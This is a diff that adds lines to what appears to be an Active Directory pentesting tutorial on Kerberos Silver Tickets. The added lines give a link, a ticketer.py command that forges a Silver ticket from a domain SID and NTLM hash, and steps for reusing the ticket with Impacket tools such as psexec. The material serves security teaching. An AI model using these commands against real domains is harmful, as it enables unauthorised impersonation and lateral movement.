@@ -736,6 +736,10 @@ Let's skip the exploiting part and presume we have the `NTLM` hash of a Service 
 
 
 
+There is also some great examples here on creating Silver Tickets to work with LDAP, PS Remoting etc
+
+*https://adsecurity.org/?p=2011*
+
 I hope this makes sense to people, now for the practical examples.
 
 
@@ -902,6 +906,28 @@ Here we find ourselves again on a Linux machine wanting to do Windows things so 
 
 
 I truthfully just learnt about this script after doing some Googling so I am not expert on it's internals but after a brief overview it appears as if `ticketer.py` allows you to generate forged `Silver` and `Golden` tickets which will come in handy for the next section about `Golden Tickets` 
+
+
+
+The Syntax for Ticketer is as follows
+
+```python
+m0chan@kali:/scripts/> python ticketer.py -domain-sid S-1-5-21-1473643419-774954089-2222323452 -nthash d7e2b80507ea074ad59f152a1ba20458 -domain m0chanAD.local -spn cifs/workstation.m0chanAD.local m0chan
+    
+#This will export a .ccache file which can be imported by executing the below command
+
+KRB5CCNAME=/scripts/m0chan.ccache 
+
+We can then pass the -K switch through with any other Impacket scripts and it will automatically use the cached kerberos ticket, such as PSEXec, WMIExec (i think).
+```
+
+
+
+Truthfully that's all I have for Linux, I am more than happy for someone to submit a Commit with a better solution and I will happily review it and perhaps add it on here.
+
+
+
+## [](#header-3)Mitigation / Defending Silver Tickets
 
 
 
